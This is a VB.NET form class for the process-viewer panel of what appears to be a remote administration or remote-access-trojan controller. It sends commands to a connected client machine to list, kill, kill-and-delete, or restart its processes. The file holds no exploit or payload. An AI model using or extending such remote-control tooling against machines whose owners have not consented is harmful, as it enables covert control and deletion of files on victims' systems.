Public Class ProcessV
    Public C As Client
    Private Sub ProcessV_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ref()
        Timer2.Start()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click

        ListView1.Items.Clear()

        Dim B As Byte() = SB("R#")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("kill" & Settings.SPL & item.SubItems(1).Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
        ref()
    End Sub
    Function ref()

        ListView1.Items.Clear()

        Threading.Thread.Sleep(500)
        Dim B As Byte() = SB("R#")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Function

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            ToolStripStatusLabel1.Text = "Process [" & ListView1.Items.Count & "]"
            ToolStripStatusLabel2.Text = "Selected [" & ListView1.SelectedItems.Count.ToString & "]"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub KillDelToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillDelToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim B As Byte() = SB("kD" & Settings.SPL & item.SubItems(1).Text & Settings.SPL & item.SubItems(2).Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Next
        ref()
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("RST" & Settings.SPL & item.SubItems(1).Text & Settings.SPL & item.SubItems(2).Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
        ref()
    End Sub
End Class